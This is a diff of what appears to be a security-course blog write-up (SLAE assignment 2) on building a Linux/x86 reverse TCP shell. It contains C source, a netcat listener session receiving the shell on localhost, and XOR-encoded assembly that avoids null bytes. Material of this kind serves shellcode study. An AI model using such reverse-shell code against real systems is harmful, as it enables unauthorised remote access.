@@ -25,7 +25,7 @@ Again, let's start off by breaking down the code's major working parts. The shel
 We can now write some c code based on this outline. Of course as you can see, this is slightly less complex, compared to the bind shell done previously:
 
 ```c
-// SLAE Assignment 1: Reverse TCP Shell (Linux/x86)
+// SLAE Assignment 2: Reverse TCP Shell (Linux/x86)
 // Author: 4p0cryph0n
 // Website: https://4p0cryph0n.github.io
 
@@ -60,3 +60,67 @@ int main()
 }
 ```
 In this code, we will only need the ```connect()``` function, instead of ```listen()```, ```bind()```, and ```accept()```. Keep in mind though, in order to duplicate the standard file descriptors, we will use our initial socket descriptor, different from what we did in the bind shell.
+
+```c
+#include <sys/types.h>          /* See NOTES */
+       #include <sys/socket.h>
+
+       int connect(int sockfd, const struct sockaddr *addr,
+                   socklen_t addrlen);
+```
+
+Let's compile and run this:
+```
+Terminal 1:
+$ gcc rev_shell.c -o rev_shell
+rev_shell.c: In function ‘main’:
+rev_shell.c:16:28: warning: implicit declaration of function ‘inet_addr’ [-Wimplicit-function-declaration]
+   16 |     addr.sin_addr.s_addr = inet_addr("127.0.0.1"); //Use any interface to listen
+      |                            ^~~~~~~~~
+$ ./rev_shell
+
+Terminal 2:
+$ nc -lvp 4443
+listening on [any] 4443 ...
+connect to [127.0.0.1] from localhost [127.0.0.1] 59340
+uname -a
+Linux kali 5.4.0-kali3-686-pae #1 SMP Debian 5.4.13-1kali1 (2020-01-20) i686 GNU/Linux
+```
+Alright! let's start writing the assembly code for this.
+
+## Assembly Time! ##
+Okay so we first need the syscall number for ```connect()```. We can find this in ```/usr/include/linux/net.h```:
+```
+#define SYS_CONNECT     3               /* sys_connect(2)               */
+```
+So most of the code is going to be the same as the previously written bind shell, only with a few differences. The start will stay the same:
+```nasm
+xor eax, eax
+xor ebx, ebx
+xor ecx, ecx
+cdq               ;clears edx
+
+
+; create socket s=socket(2,1,0)
+mov al, 0x66
+inc ebx           ;ebx=1
+push edx          ;0
+push ebx          ;1
+push 0x2          ;2
+mov ecx, esp      ;pointer to args
+int 0x80          ;syscall
+mov esi, eax      ;sockfd
+```
+The address structure will be slightly different, as we need to add ```127.0.0.1``` as the address to connect to. Now keep in mind that we will need to enter this in Little Endian, so what we need to pass is ```0100007f```. Also, in order to avoid the nulls, it is a good idea to ```xor``` encode it first, and decode it in the assembly code itself.
+
+We will also push 8 bytes of NULL padding with this:
+```nasm
+mov eax, 0xabaaaad5   ;127.0.0.1 (xored with key 0xaaaaaaa)
+mov ebx, 0xaaaaaaaa
+xor eax, ebx
+push edx              ;padding(NULLs)
+push eax              ;127.0.0.1
+push word 0x5b11      ;4443
+push word 0x2         ;AF_INET
+mov ecx, esp          ;pointer to args
+```
